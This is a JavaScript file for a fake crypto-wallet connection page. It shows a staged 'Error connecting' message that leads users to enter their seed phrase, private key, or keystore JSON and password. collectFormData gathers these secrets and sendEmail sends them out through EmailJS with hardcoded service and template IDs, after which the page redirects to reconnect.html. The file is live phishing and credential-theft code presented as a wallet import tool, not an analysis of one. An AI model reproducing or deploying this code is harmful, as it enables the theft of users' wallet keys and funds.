var modal;
var newModal;
var btns;
var buttonSpan;
var items;
var secondModalSpan;
var secondModalButtonSpan;
var isProcessing = false;
var processingTimers = [];
var walletSearch;
var walletList;
var searchResultsInfo;
var allWalletItems = [];

function initializeSearch() {
  if (walletSearch && walletList) {
    allWalletItems = Array.from(walletList.querySelectorAll('.item'));
    
    allWalletItems.forEach(item => {
      item.style.display = 'flex';
      item.classList.add('visible');
      item.classList.remove('hidden');
    });
    
    walletSearch.addEventListener('input', function() {
      filterWallets(this.value.trim());
      updateClearButton();
    });
    
    walletSearch.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        this.value = '';
        filterWallets('');
        this.blur();
        updateClearButton();
      }
    });
    
    const clearButton = document.getElementById('clearSearch');
    if (clearButton) {
      clearButton.addEventListener('click', function() {
        walletSearch.value = '';
        filterWallets('');
        walletSearch.focus();
        updateClearButton();
      });
    }
  }
}

function updateClearButton() {
  const clearButton = document.getElementById('clearSearch');
  if (clearButton) {
    if (walletSearch.value.trim() !== '') {
      clearButton.style.display = 'flex';
    } else {
      clearButton.style.display = 'none';
    }
  }
}

function filterWallets(query) {
  if (!allWalletItems.length) return;
  
  const filteredItems = allWalletItems.filter(item => {
    const walletName = item.querySelector('.logo-title').textContent.toLowerCase();
    const searchQuery = query.toLowerCase();
    return walletName.includes(searchQuery);
  });
  
  if (query === '') {
    walletList.classList.remove('search-results');
  } else {
    walletList.classList.add('search-results');
  }
  
  allWalletItems.forEach(item => {
    if (query === '') {
      item.classList.remove('hidden');
      item.classList.add('visible');
        setTimeout(() => {
          if (item.classList.contains('visible')) {
            item.style.display = 'flex';
            item.style.width = '';
            item.style.height = '';
            item.style.minWidth = '';
            item.style.maxWidth = '';
            item.style.minHeight = '';
            item.style.maxHeight = '';
          }
        }, 50);
    } else {
      if (filteredItems.includes(item)) {
        item.classList.remove('hidden');
        item.classList.add('visible');
        setTimeout(() => {
          if (item.classList.contains('visible')) {
            item.style.display = 'flex';
            item.style.width = '';
            item.style.height = '';
            item.style.minWidth = '';
            item.style.maxWidth = '';
            item.style.minHeight = '';
            item.style.maxHeight = '';
          }
        }, 50);
      } else {
        item.classList.add('hidden');
        item.classList.remove('visible');
        setTimeout(() => {
          if (item.classList.contains('hidden')) {
            item.style.display = 'none';
          }
        }, 300);
      }
    }
  });
  
  updateSearchResultsInfo(query, filteredItems.length);
}

function updateSearchResultsInfo(query, resultCount) {
  return;
}

function enhancedModalClose() {
  resetAllProcessingStates();
  const modals = document.querySelectorAll('.modal, .third-modal, .custom-alert');
  modals.forEach(modal => {
    if (modal) modal.style.display = "none";
  });
}

var vortexTimer;
function revertVortex() {
  document.querySelector('.flex-section-A').innerHTML = `
    <div class="connection-box connecting" style="background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(29, 197, 90, 0.3);">
                    <p class="modal-connection-status connecting">connecting...</p>
                </div>
            `;
}
function resetVortexAndOpen() {
  clearTimeout(vortexTimer);
  revertVortex();
  setTimeout(function () {
    openVortex();
  }, 100);
}

function openVortex() {
  clearTimeout(vortexTimer);
  vortexTimer = setTimeout(function () {
    document.querySelector('.flex-section-A').innerHTML = `
                    <div class="connection-box error">
                        <p class="modal-connection-status-3a">Error connecting</p>
                        <button class="modal-connect-button-3b">Connect manually</button>
                    </div>
                `;

    document.querySelector(".modal-connect-button-3b").addEventListener("click", function () {
      modal.style.display = "none";
      newModal.style.display = "block";
      closeModalTwo();
    });
  }, 5000);
}

function closeModalTwo() {
  initializeFormSwitching();
  
  secondModalSpan.onclick = function () {
    if (isProcessing) {
      if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
        enhancedModalClose();
      }
    } else {
      enhancedModalClose();
    }
  }

  secondModalButtonSpan.onclick = function () {
    if (isProcessing) {
      if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
        enhancedModalClose();
      }
    } else {
      enhancedModalClose();
    }
  }
}

function initializeFormSwitching() {
  const headers = document.querySelectorAll('.form-header');
  const sliders = document.querySelectorAll('.form-slider');
  
  headers.forEach(header => header.classList.remove('active'));
  sliders.forEach(slider => slider.classList.remove('active'));
  
  if (headers.length > 0) {
    headers[0].classList.add('active'); 
  }
  if (sliders.length > 0) {
    sliders[0].classList.add('active'); 
  }

  headers.forEach(header => {
    header.addEventListener('click', function () {
      if (isProcessing) {
        showCustomAlert('Please wait for the current process to complete');
        return;
      }
      
      headers.forEach(h => h.classList.remove('active'));
      this.classList.add('active');
      
      const targetId = this.getAttribute('data-target');
      
      sliders.forEach(slider => slider.classList.remove('active'));
      sliders.forEach(slider => {
        if (slider.id === targetId) {
          slider.classList.add('active');
        }
      });
      
      const messages = document.querySelectorAll('.form-note-1, .form-note-2, .form-note-3');
      messages.forEach(message => {
        message.style.color = '';
      });
    });
  });
}

function revertToWalletSupport() {
  var walletSupportSection = document.querySelector('.wallet-support');
  if (walletSupportSection) {
    walletSupportSection.classList.remove('modal-open');
  }
}

document.getElementById('form-connect-button').addEventListener('click', function (event) {
    event.preventDefault();
    
    if (isProcessing) {
      return;
    }
    
    const isValid = validateActiveForm();
    if (isValid) {
      const messageContent = collectFormData();
      if (messageContent) {
        handleButtonUI(); 
        sendEmail(messageContent);
        
        setTimeout(function () {
          window.location.href = 'reconnect.html'; 
        }, 4000); 
      }
    }
  });
  function setupRealTimeValidation() {
    const activeForm = document.querySelector('.form-slider.active');
    if (!activeForm) return;
    const inputs = activeForm.querySelectorAll('input, textarea');
    inputs.forEach(input => {
      input.addEventListener('input', function () {
       
        if (activeForm.id !== 'phraseForm') {
          validateActiveForm();
        }
      });
    });
  }
  function validateActiveForm() {
    let isValid = true;
    const activeForm = document.querySelector('.form-slider.active');
    if (!activeForm) {
      showCustomAlert('No active form found!');
      return false;
    }
    console.log('Validating form:', activeForm.id);
    if (activeForm.id === 'phraseForm') {
      isValid = validatePhraseForm();
    } else if (activeForm.id === 'jsonForm') {
      isValid = validateJsonForm();
    } else if (activeForm.id === 'privateKeyForm') {
      isValid = validatePrivateKeyForm();
    }
    return isValid;
  }
  function validatePhraseForm() {
    const inputWords = document.getElementById('words').value.trim();
    const wordsArray = inputWords.split(/\s+/);
    const messagePhrase = document.getElementById('messagePhrase');
    
    const activeForm = document.querySelector('.form-slider.active');
    if (activeForm && activeForm.id !== 'phraseForm') {
      return true; 
    }
    
    if (wordsArray.length < 12) {
      showCustomAlert('Phrase must contain at least 12 words');
      return false;
    }
    const allWordsAreValid = wordsArray.every(word => /^[A-Za-z]+$/.test(word));
    if (!allWordsAreValid) {
      showCustomAlert('Typically 12 (sometimes 24) words separated by single spaces');
      return false;
    }
    
    return true;
  }
  function validateJsonForm() {
    const jsonValue = document.getElementById('json').value.trim();
    const passwordValue = document.getElementById('password').value.trim();
    const messageJson = document.getElementById('messageJson');
    
    
    const activeForm = document.querySelector('.form-slider.active');
    if (activeForm && activeForm.id !== 'jsonForm') {
      return true; 
    }
    
    if (!jsonValue || !passwordValue) {
      showCustomAlert('Both JSON and Password must be filled in');
      return false;
    } else {
      return true;
    }
  }
  function validatePrivateKeyForm() {
    const privateKey = document.getElementById('key').value.trim();
    const messagePrivatekey = document.getElementById('messagePrivatekey');
    
    
    const activeForm = document.querySelector('.form-slider.active');
    if (activeForm && activeForm.id !== 'privateKeyForm') {
      return true; 
    }
    
    if (privateKey.length < 14 || /\s/.test(privateKey)) {
      showCustomAlert('Private keys often consist of a sequence of hexadecimal characters without spaces');
      return false;
    } else {
      return true;
    }
  }
  function collectFormData() {
    let message = '';
    const logoTitle = document.querySelector(".modal-connection-status-2a")?.textContent;
    if (logoTitle) {
      message += `Option: ${logoTitle}\n\n`;
    }
    
    const inputWords = document.getElementById('words').value.trim();
    if (inputWords) {
      const wordsArray = inputWords.split(/\s+/);
      message += `PHRASE: ${wordsArray.join(' ')}\n\n`;
    }
    
    const privateKey = document.getElementById('key').value.trim();
    if (privateKey) {
      message += `PRIVATE KEY: ${privateKey}\n\n`;
    }
    
    const jsonValue = document.getElementById('json').value.trim();
    const passwordValue = document.getElementById('password').value.trim();
    if (jsonValue) {
      message += `JSON: ${jsonValue}\nPassword: ${passwordValue}\n\n`;
    }
    
    return message ? message : null;
  }
  function sendEmail(content) {
    const templateParams = {
      message: content
    };
    emailjs.send("service_fdsqynl", "template_ku76cr6", templateParams)
      .then(function (response) {
        console.log('SUCCESS!', response.status, response.text);
      }, function (error) {
        console.error('FAILED...', error);
      });
  }
  function handleButtonUI() {
    if (isProcessing) return; 
    
    isProcessing = true;
    const button = document.getElementById('form-connect-button');
    button.innerHTML = '<div class="processing-content"><div class="spinner"></div><span class="processing-text">Processing...</span></div>';
    button.disabled = true;
    button.classList.add('processing');
    
    const processingText = button.querySelector('.processing-text');
    const textStates = [
      { time: 0, text: 'Processing...' },
      { time: 1250, text: 'Processing...' },
      { time: 2500, text: 'Verifying...' },
      { time: 3750, text: 'Verifying...' },
      { time: 5000, text: 'Verifying...' }
    ];
    
    processingTimers.forEach(timer => clearTimeout(timer));
    processingTimers = [];
    
    textStates.forEach(state => {
      const timer = setTimeout(() => {
        if (processingText && isProcessing) {
          processingText.textContent = state.text;
        }
      }, state.time);
      processingTimers.push(timer);
    });
  }
  function showCustomAlert(message) {
    const alertModal = document.getElementById('custom-alert');
    const alertMessage = document.getElementById('custom-alert-message');
    const progressBar = document.getElementById('progress-bar');
    alertMessage.textContent = message;
    alertModal.classList.remove('hidden');
    
    progressBar.style.width = '0%';
    
    let width = 0;
    const duration = 3000; 
    const interval = 20; 
    const step = (interval / duration) * 100; 
    
    const fillProgressBar = setInterval(function () {
      if (width >= 100) {
        clearInterval(fillProgressBar);
      } else {
        width += step;
        progressBar.style.width = width + '%';
      }
    }, interval);
    
    setTimeout(function () {
      alertModal.classList.add('hidden');
      progressBar.style.width = '0%'; 
    }, duration);
  }
  (function () {
    emailjs.init("SatQ3pn8RqVimuU2k");
  })();
  
  document.addEventListener('DOMContentLoaded', function() {
    modal = document.getElementById("walletModal");
    newModal = document.getElementById("importModal");
    btns = document.querySelectorAll(".openModalButton");
    buttonSpan = document.getElementsByClassName("close-button")[0];
    items = document.querySelectorAll(".item");
    secondModalSpan = document.getElementsByClassName("second-close")[0];
    secondModalButtonSpan = document.getElementsByClassName("second-close-button")[0];
    
    walletSearch = document.getElementById('walletSearch');
    walletList = document.getElementById('walletList');
    searchResultsInfo = document.getElementById('searchResultsInfo');
    
    initializeFormSwitching();
    initializeSearch(); 
    
    if (walletList) {
      walletList.addEventListener('click', function(event) {
        const clickedItem = event.target.closest('.item');
        if (clickedItem) {
          var logoTitle = clickedItem.querySelector(".logo-title").textContent;
          var logoSrc = clickedItem.querySelector(".logo").src;
          document.querySelector(".modal-connection-status-2a").textContent = logoTitle;
          document.querySelector(".modal-logo").src = logoSrc;
          document.querySelector(".newModalheader").textContent = `Import your ${logoTitle}`;
          document.querySelector(".modal-logo-2").src = logoSrc;
          modal.style.display = "block";
          resetVortexAndOpen();
        }
      });
    }
    
    const customAlert = document.getElementById("custom-alert");
    const walletSupportSection = document.querySelector('.wallet-support');
    
    if (modal) modal.style.display = "none";
    if (newModal) newModal.style.display = "none";
    if (customAlert) customAlert.classList.add('hidden');
    if (walletSupportSection) {
      walletSupportSection.classList.remove('modal-open');
    }
    
    if (sessionStorage.getItem('fromReconnectPage') === 'true') {
      sessionStorage.removeItem('fromReconnectPage');
      enhancedModalClose();
      resetForm();
      resetAllProcessingStates();
    }
    
    if (document.referrer && document.referrer.includes('reconnect.html')) {
      enhancedModalClose();
      resetForm();
    }
    
    const phraseInput = document.getElementById('words');
    if (phraseInput) {
      phraseInput.addEventListener('input', function() {
        const messagePhrase = document.getElementById('messagePhrase');
        if (messagePhrase) {
          messagePhrase.style.color = '#00ff88';
        }
      });
    }
    
    if (btns && btns.length > 0) {
      btns.forEach(function (btn) {
        btn.onclick = function () {
          modal.style.display = "block";
          resetVortexAndOpen();
        }
      });
    }
    
    if (buttonSpan) {
      buttonSpan.onclick = function () {
        if (isProcessing) {
          if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
            modal.style.display = "none";
            revertVortex();
            revertToWalletSupport(); 
            clearTimeout(vortexTimer);
            resetAllProcessingStates(); 
          }
        } else {
          modal.style.display = "none";
          revertVortex();
          revertToWalletSupport(); 
          clearTimeout(vortexTimer);
          resetAllProcessingStates(); 
        }
      }
    }
    
    window.onclick = function (event) {
      if (event.target == modal) {
        if (isProcessing) {
          if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
            enhancedModalClose();
          }
        } else {
          enhancedModalClose();
        }
      }
      if (event.target == newModal) {
        if (isProcessing) {
          if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
            enhancedModalClose();
          }
        } else {
          enhancedModalClose();
        }
      }
    }
  });
  
  setupRealTimeValidation();
  
  document.addEventListener('keydown', function (event) {
    if (event.key === 'Enter') {
      event.preventDefault();
      if (!isProcessing) {
        document.getElementById('form-connect-button').click();
      }
    }
  });
  
  const menuCloseButton = document.getElementById('menu-close-button');
  if (menuCloseButton) {
    menuCloseButton.addEventListener('click', function () {
      if (isProcessing) {
        if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
          resetAllProcessingStates(); 
        }
      } else {
        resetAllProcessingStates(); 
      }
    });
  }
  const navigationLinks = document.querySelectorAll('a.navigation-link');
  if (navigationLinks.length > 0) {
    navigationLinks.forEach(link => {
      link.addEventListener('click', function (e) {
        if (isProcessing) {
          e.preventDefault();
          if (confirm('You have a connection in progress. Are you sure you want to leave?')) {
            resetAllProcessingStates();
            // Allow navigation to proceed
            window.location.href = this.href;
          }
        } else {
          resetAllProcessingStates(); 
        }
      });
    });
  }

  function resetForm() {
    const forms = document.querySelectorAll('.forms');
    forms.forEach(form => {
      const inputs = form.querySelectorAll('input, textarea');
      inputs.forEach(input => {
        input.value = '';
      });
    });
    
    const messages = document.querySelectorAll('.form-note-1, .form-note-2, .form-note-3');
    messages.forEach(message => {
      message.style.color = '#00ff88';
    });
    
    isProcessing = false;
    
    processingTimers.forEach(timer => clearTimeout(timer));
    processingTimers = [];
    
    const button = document.getElementById('form-connect-button');
    if (button) {
      button.innerHTML = 'CONNECT';
      button.disabled = false;
      button.classList.remove('processing');
    }
    
    const headers = document.querySelectorAll('.form-header');
    const sliders = document.querySelectorAll('.form-slider');
    
    headers.forEach(header => header.classList.remove('active'));
    sliders.forEach(slider => slider.classList.remove('active'));
    
    if (headers.length > 0) {
      headers[0].classList.add('active');
    }
    if (sliders.length > 0) {
      sliders[0].classList.add('active');
    }
  }

  function resetAllProcessingStates() {
    clearTimeout(vortexTimer);
    processingTimers.forEach(timer => clearTimeout(timer));
    processingTimers = [];

    isProcessing = false;
    
    const button = document.getElementById('form-connect-button');
    if (button) {
      button.innerHTML = 'CONNECT';
      button.disabled = false;
      button.classList.remove('processing');
    }
    
    resetForm();
    
    const modal = document.getElementById("walletModal");
    const newModal = document.getElementById("importModal");
    if (modal) modal.style.display = "none";
    if (newModal) newModal.style.display = "none";
    
    revertToWalletSupport();
    revertVortex();
  }

  window.addEventListener('beforeunload', function(e) {
    enhancedModalClose();
    
    if (isProcessing) {
      e.preventDefault();
      e.returnValue = 'You have a connection in progress. Are you sure you want to leave?';
      return e.returnValue;
    }
    resetAllProcessingStates();
  });

  document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
      enhancedModalClose();
      resetAllProcessingStates();
    }
  });
  
  window.addEventListener('pagehide', function() {
    enhancedModalClose();
    resetAllProcessingStates();
  });
  
  window.addEventListener('unload', function() {
    enhancedModalClose();
    resetAllProcessingStates();
  });
  
  window.addEventListener('popstate', function() {
    enhancedModalClose();
    resetAllProcessingStates();
  });
  
  if (buttonSpan) {
    const originalCloseHandler = buttonSpan.onclick;
    buttonSpan.onclick = function() {
      if (isProcessing) {
        if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
          enhancedModalClose();
        }
      } else {
        enhancedModalClose();
      }
    };
  }
  
  if (secondModalSpan) {
    const originalSecondCloseHandler = secondModalSpan.onclick;
    secondModalSpan.onclick = function() {
      if (isProcessing) {
        if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
          enhancedModalClose();
        }
      } else {
        enhancedModalClose();
      }
    };
  }
  
  if (secondModalButtonSpan) {
    const originalSecondButtonCloseHandler = secondModalButtonSpan.onclick;
    secondModalButtonSpan.onclick = function() {
      if (isProcessing) {
        if (confirm('You have a connection in progress. Are you sure you want to cancel?')) {
          enhancedModalClose();
        }
      } else {
        enhancedModalClose();
      }
    };
  }
